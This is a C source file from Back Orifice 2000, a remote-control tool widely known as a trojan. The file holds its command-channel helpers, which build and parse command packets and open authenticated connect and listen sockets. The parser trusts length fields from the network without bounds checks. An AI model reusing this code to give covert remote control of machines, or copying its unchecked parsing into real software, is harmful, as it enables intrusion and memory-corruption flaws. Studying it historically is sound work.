/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// BO2K Command Networking Util Functions

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commnet.h>

extern CIOHandler *g_pIOHandler;
extern CEncryptionHandler *g_pEncryptionHandler;
extern CAuthHandler *g_pAuthHandler;

void BreakDownCommand(BYTE *pInBuffer, int *cmdlen, int *command, int *comid, int *nArg1, char **svArg2, char **svArg3)
{
	struct bo_command_header *hdr;
	
	hdr=(struct bo_command_header *)pInBuffer;

	*cmdlen=hdr->cmdlen;
	*command=hdr->command;
	*comid=hdr->comid;
	*nArg1=hdr->nArg1;
	if(hdr->nArg2Len>0) {
		*svArg2=(char *)(pInBuffer+sizeof(struct bo_command_header));
	} else *svArg2=NULL;
	if(hdr->nArg3Len>0) {
		*svArg3=(char *)(pInBuffer+sizeof(struct bo_command_header)+hdr->nArg2Len);
	} else *svArg3=NULL;
}


BYTE *BuildCommandRequest(int command, int comid, int nArg1, char *svArg2, char *svArg3, int *pnReqLen)
{
	BYTE *buffer;
	struct bo_command_header *hdr;
	int buflen,nArg2Len,nArg3Len;
	
	buflen=sizeof(struct bo_command_header) + sizeof(int);
	nArg2Len=0;
	nArg3Len=0;
	if(svArg2!=NULL) {
		nArg2Len = (lstrlen(svArg2)+1);
		buflen += nArg2Len;
	}
	if(svArg3!=NULL) {
		nArg3Len = (lstrlen(svArg3)+1);
		buflen += nArg3Len;
	}


	buffer=(BYTE *) malloc(buflen);
	if(buffer==NULL) {
		*pnReqLen=0;
		return NULL;
	}
	memset(buffer,0,buflen);

	hdr=(struct bo_command_header *)buffer;	

	hdr->cmdlen=buflen;
	hdr->comid=comid;
	hdr->command=command;
	hdr->flags=CMDFLAG_COMMAND;
	hdr->nArg1=nArg1;
	hdr->nArg2Len=nArg2Len;
	hdr->nArg3Len=nArg3Len;
	if(svArg2!=NULL) {
		lstrcpyn((char *)buffer+sizeof(struct bo_command_header),svArg2,nArg2Len);
	}
	if(svArg3!=NULL) {
		lstrcpyn((char *)buffer+sizeof(struct bo_command_header)+nArg2Len,svArg3,nArg3Len);
	}

	*pnReqLen=buflen;
	return buffer;
}

BYTE *BuildCommandReply(int comid, int nReplyCode, char *svReply, int *pnReqLen)
{
	BYTE *buffer;
	struct bo_command_header *hdr;
	int buflen,nReplyLen;
	
	buflen=sizeof(struct bo_command_header) + sizeof(int);
	nReplyLen=0;
	if(svReply!=NULL) {
		nReplyLen = (lstrlen(svReply)+1);
		buflen += nReplyLen;
	}
	

	buffer=(BYTE *) malloc(buflen);
	if(buffer==NULL) {
		*pnReqLen=0;
		return NULL;
	}
	memset(buffer,0,buflen);

	hdr=(struct bo_command_header *)buffer;	

	hdr->cmdlen=buflen;
	hdr->comid=comid;
	hdr->command=-1;
	hdr->flags=CMDFLAG_REPLY;
	hdr->nArg1=nReplyCode;
	hdr->nArg2Len=nReplyLen;
	hdr->nArg3Len=0;
	if(svReply!=NULL) {
		lstrcpyn((char *)buffer+sizeof(struct bo_command_header),svReply,nReplyLen);
	}

	*pnReqLen=buflen;		
	return buffer;
}

void FreeCommandMemory(BYTE *pCmd)
{
	free(pCmd);
}

int IssueAuthCommandRequest(CAuthSocket *cas_from, int command, int comid, int nArg1, char *svArg2, char *svArg3)
{
	BYTE *buf;
	int buflen,ret;
	
	if(cas_from==NULL) return 0;

	buf=BuildCommandRequest(command, comid, nArg1, svArg2, svArg3, &buflen);
	ret=cas_from->Send(buf,buflen);
	FreeCommandMemory(buf);
	return ret;
}

int IssueAuthCommandReply(CAuthSocket *cas_from, int comid, int nReplyCode, char *svReply)
{
	BYTE *buf;
	int buflen,ret;

	if(cas_from==NULL) return 0;

	buf=BuildCommandReply(comid, nReplyCode, svReply, &buflen);
	ret=cas_from->Send(buf,buflen);
	FreeCommandMemory(buf);
	return ret;
}


CAuthSocket *CreateAuthSocket(char *svRNetMod, char *svREncryption, char *svRAuth)
{
	IO_HANDLER *pioh=g_pIOHandler->GetHandlerByID(svRNetMod);
	if(pioh==NULL) return NULL;

	ENCRYPTION_ENGINE *peh=g_pEncryptionHandler->GetEngineByID(svREncryption);
	if(peh==NULL) return NULL;

	AUTH_HANDLER *pah=g_pAuthHandler->GetHandlerByID(svRAuth);
	if(pah==NULL) return NULL;

	CAuthSocket *pcas=new CAuthSocket(pah,pioh,peh);
	if(pcas==NULL) return NULL;

	return pcas;
}

CAuthSocket *ConnectAuthSocket(INTERACTIVE_CONNECT *pIC, int nUserId, HWND hParent, LPCSTR svBindStr, LPCSTR svNetMod, LPCSTR svEncryption, LPCSTR svAuth)
{
	char svRNetMod[256];
	char svRBindStr[256];
	char svREncryption[256];
	char svRAuth[256];

	if(pIC!=NULL) {
		if((*pIC)(hParent,svBindStr,svNetMod,svEncryption,svAuth,svRBindStr,svRNetMod,svREncryption,svRAuth)<0)
			return NULL;
	} else {
		if(svNetMod==NULL || svBindStr==NULL || svEncryption==NULL || svAuth==NULL) return NULL;
		
		lstrcpyn(svRNetMod,svNetMod,256);
		lstrcpyn(svRBindStr,svBindStr,256);
		lstrcpyn(svREncryption,svEncryption,256);
		lstrcpyn(svRAuth,svAuth,256);
	}

	CAuthSocket *pcas=CreateAuthSocket(svRNetMod,svREncryption,svRAuth);
	if(pcas==NULL) return (CAuthSocket *)0xFFFFFFFF;

	if(pcas->Connect(svRBindStr,nUserId)<0) {
		delete pcas;
		return (CAuthSocket *)0xFFFFFFFF;
	}

	return pcas;
}

CAuthSocket *ListenAuthSocket(INTERACTIVE_LISTEN *pIL, int nUserId, HWND hParent, LPCSTR svBindStr, LPCSTR svNetMod, LPCSTR svEncryption, LPCSTR svAuth)
{
	char svRNetMod[256];
	char svRBindStr[256];
	char svREncryption[256];
	char svRAuth[256];

	if(pIL!=NULL) {
		if((*pIL)(hParent,svBindStr,svNetMod,svEncryption,svAuth,svRBindStr,svRNetMod,svREncryption,svRAuth)<0)
			return NULL;
	} else {
		if(svNetMod==NULL || svBindStr==NULL || svEncryption==NULL || svAuth==NULL) return NULL;
		
		lstrcpyn(svRNetMod,svNetMod,256);
		lstrcpyn(svRBindStr,svBindStr,256);
		lstrcpyn(svREncryption,svEncryption,256);
		lstrcpyn(svRAuth,svAuth,256);
	}

	CAuthSocket *pcas=CreateAuthSocket(svRNetMod,svREncryption,svRAuth);
	if(pcas==NULL) return (CAuthSocket *)0xFFFFFFFF;

	if(pcas->Listen(svRBindStr,nUserId)<0) {
		delete pcas;
		return (CAuthSocket *)0xFFFFFFFF;
	}

	return pcas;
}

